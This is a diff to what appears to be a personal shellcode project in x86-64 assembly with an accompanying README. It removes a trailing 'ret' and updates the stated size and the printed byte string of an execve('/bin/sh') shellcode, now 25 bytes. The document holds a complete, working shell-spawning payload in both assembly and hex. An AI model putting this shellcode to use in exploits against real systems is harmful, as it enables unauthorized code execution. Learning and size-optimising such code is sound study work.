@@ -24,7 +24,6 @@ _start:
 				# bits of %rax to make the size smaller
 
 	syscall			# execute execve
-	ret
 path:
 	.string "/bin/sh"	# path to sh
 
@@ -70,12 +69,6 @@ _start:
 <br>
 
 ```assembly
-    ret
-```
-- `ret`: This instruction serves as an exit point.
-<br>
-
-```assembly
 path:
     .string "/bin/sh"      # path to sh
 ```
@@ -83,7 +76,7 @@ path:
 <br>
 
 ## Size
-My shellcode is **26 bytes long**. Here they are: `48 8D 3D 0B 00 00 00 48 31 D2 48 31 F6 B0 3B 0F 05 C3 2F 62 69 6E 2F 73 68 00`
+My shellcode is **25 bytes long**. Here they are: `48 8D 3D 0A 00 00 00 48 31 D2 48 31 F6 B0 3B 0F 05 2F 62 69 6E 2F 73 68 00`
 
 ## Other approaches
 This was the first code that could actually work. The size of the shellcode was 36, so I decided to try to reduce this number. 
